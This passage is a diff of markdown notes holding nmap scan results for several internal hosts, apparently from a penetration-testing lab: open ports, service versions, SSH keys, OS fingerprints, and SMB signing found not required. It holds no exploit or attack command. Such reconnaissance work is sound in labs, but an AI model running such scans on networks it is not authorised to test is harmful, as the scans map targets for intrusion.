+| xFEynnMkM+8sK+PcpUE4cvIjTh68etEXit1ADO9bWp2+9E3QZolSFNuG5C9vFFCK
+| gJcbjszj8xwZ3QDsq6fr2ZSVuTkYIh5FIym07aSNS9O26r5/v3ur7LzbRDBS6t/m
+| DYlG3NvqM0mlgqZLgqKSkmBzjruVCYY+4XujqRVGIYXgCMfOGb47amsw2qHMjM11
+| 8Ic5BvXfb3e5wIZ+GuwrOd9yf21r1Ql31VG9c04PBv8nDGx39t+dwn5K9dVi9DVg
+| Aol7JyhaP4kboL+qZYIIX4Wc0sM=
+|_-----END CERTIFICATE-----
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): IBM z/OS 1.11.X (85%)
+OS CPE: cpe:/o:ibm:zos:1.11
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: IBM z/OS 1.11 (85%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.95%E=4%D=8/28%OT=135%CT=%CU=%PV=Y%G=N%TM=68AFF14F%P=x86_64-pc-linux-gnu)
+SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%TS=A)
+SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=I%II=RI%TS=A)
+OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
+WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
+ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
+T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
+T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=S%TG=40%CD=S)
+
+Uptime guess: 0.731 days (since Wed Aug 27 08:31:39 2025)
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: Incrementing by 2
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-08-28T06:03:19
+|_  start_date: N/A
+| nbstat: NetBIOS name: WK02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:2d:03 (VMware)
+| Names:
+|   WK02<20>             Flags: <unique><active>
+|   WK02<00>             Flags: <unique><active>
+|   RELIA<00>            Flags: <group><active>
+| Statistics:
+|   00:50:56:ab:2d:03:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 12607/tcp): CLEAN (Timeout)
+|   Check 2 (port 24536/tcp): CLEAN (Timeout)
+|   Check 3 (port 50852/udp): CLEAN (Timeout)
+|   Check 4 (port 34705/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+```
+## 19 (??)
+### portscan
+```
+Open 172.16.119.19:22
+```
+### port details
+```
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c7:62:4a:de:a5:b4:f1:2a:5a:f3:a1:d8:d3:96:1b:8d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG4jf10ZuWPnEsmqxv9XExNgdd+ehcSaBEwBSQiS7leR1yk2Jti3+YG2kaYvVEYXPfuOkBR27MJoLbqo7LBgt3U=
+|   256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKozyldN+VTxMu+2OHndElEKoTVXgBFfOfqPgkCJ97Pp
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.95%E=4%D=8/28%OT=22%CT=%CU=%PV=Y%G=N%TM=68AFF1A9%P=x86_64-pc-linux-gnu)
+SEQ(SP=103%GCD=1%ISR=109%TI=RD%CI=I%II=RI%TS=A)
+SEQ(SP=105%GCD=1%ISR=107%TI=I%CI=I%II=RI%TS=A)
+OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
+WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
+ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
+T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
+T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=S%TG=40%CD=S)
+
+Uptime guess: 20.919 days (since Thu Aug  7 04:01:36 2025)
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: Incrementing by 2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+## 20 (??)
+### portscan
+```
+Open 172.16.119.20:22
+```
+### port details
+```
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
+| ssh-hostkey: 
+|   256 c8:3a:f1:c9:e1:9c:31:2d:9d:26:df:c7:c5:21:d8:e3 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDa1L06nvUFVKPp/2ZRpL5re0Q2lT17lYleYcedhFvEXfQRy9dy3G5q0ChKTWK5Xzwf0Scxrj5eSegHkJ0fmZDI=
+|   256 f6:79:92:a4:06:56:38:e3:ca:15:91:a8:dc:94:44:2c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMaP7tuofi7br3rowLfpqRhQG0FpiFx7c4vhs0Wsx26P
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.95%E=4%D=8/28%OT=22%CT=%CU=%PV=Y%G=N%TM=68AFF22F%P=x86_64-pc-linux-gnu)
+SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=RI%TS=A)
+SEQ(SP=FF%GCD=1%ISR=110%TI=I%CI=I%II=RI%TS=A)
+OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
+WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
+ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
+T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
+T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=S%TG=40%CD=S)
+
+Uptime guess: 21.564 days (since Wed Aug  6 12:35:10 2025)
+TCP Sequence Prediction: Difficulty=255 (Good luck!)
+IP ID Sequence Generation: Incrementing by 2
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+```
+## 21 (FILES)
+### portscan
+```
+Open 172.16.119.21:139
+Open 172.16.119.21:135
+Open 172.16.119.21:445
+Open 172.16.119.21:49672
+Open 172.16.119.21:49665
+Open 172.16.119.21:49664
+Open 172.16.119.21:49666
+Open 172.16.119.21:49668
+Open 172.16.119.21:49667
+Open 172.16.119.21:49669
+```
+### port details
+```
+PORT      STATE SERVICE       REASON         VERSION
+135/tcp   open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack ttl 64
+49664/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49672/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.95%E=4%D=8/28%OT=135%CT=%CU=%PV=Y%G=N%TM=68AFF2F6%P=x86_64-pc-linux-gnu)
+SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=I%II=RI%TS=A)
+SEQ(SP=108%GCD=1%ISR=10B%TI=I%CI=I%II=RI%TS=A)
+OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
+WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
+ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
+T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
+T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=S%TG=40%CD=S)
+
+Uptime guess: 24.933 days (since Sun Aug  3 03:47:54 2025)
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: Incrementing by 2
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 0s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:b1:83 (VMware)
+| Names:
+|   FILES<00>            Flags: <unique><active>
+|   RELIA<00>            Flags: <group><active>
+|   FILES<20>            Flags: <unique><active>
+| Statistics:
+|   00:50:56:ab:b1:83:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| smb2-time: 
+|   date: 2025-08-28T06:10:22
+|_  start_date: N/A
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 25389/tcp): CLEAN (Timeout)
+|   Check 2 (port 16763/tcp): CLEAN (Timeout)
+|   Check 3 (port 29564/udp): CLEAN (Timeout)
+|   Check 4 (port 17205/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+```
+## 30 (WEBBY)
+### portscan
+```
+Open 172.16.119.30:80
+Open 172.16.119.30:139
+Open 172.16.119.30:135
+Open 172.16.119.30:445
+Open 172.16.119.30:47001
+Open 172.16.119.30:49667
+Open 172.16.119.30:49670
+Open 172.16.119.30:49669
+Open 172.16.119.30:49664
+Open 172.16.119.30:49668
+Open 172.16.119.30:49666
+Open 172.16.119.30:49665
+```
+
+### port details
+```
+PORT      STATE SERVICE       REASON         VERSION
+80/tcp    open  http          syn-ack ttl 64 Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: Anna Test Machine
+135/tcp   open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack ttl 64
+47001/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.95%E=4%D=8/28%OT=80%CT=%CU=%PV=Y%G=N%TM=68AFF39A%P=x86_64-pc-linux-gnu)
+SEQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%II=RI%TS=A)
+SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%II=RI%TS=A)
+OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
+WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
+ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
+T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
+T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=S%TG=40%CD=S)
+
+Uptime guess: 31.091 days (since Mon Jul 28 00:02:10 2025)
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: Incrementing by 2
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 26469/tcp): CLEAN (Timeout)
+|   Check 2 (port 59632/tcp): CLEAN (Timeout)
+|   Check 3 (port 50442/udp): CLEAN (Timeout)
+|   Check 4 (port 43778/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| nbstat: NetBIOS name: WEBBY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:db:6d (VMware)
+| Names:
+|   WEBBY<20>            Flags: <unique><active>
+|   WEBBY<00>            Flags: <unique><active>
+|   RELIA<00>            Flags: <group><active>
+| Statistics:
+|   00:50:56:ab:db:6d:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| smb2-time: 
+|   date: 2025-08-28T06:13:06
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: 0s
+```
+
+# DMZ
 ## 249 LEGACY
 ### open ports
 ```
@@ -1848,5 +2900,4 @@ Host script results:
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled but not required
-
 ```
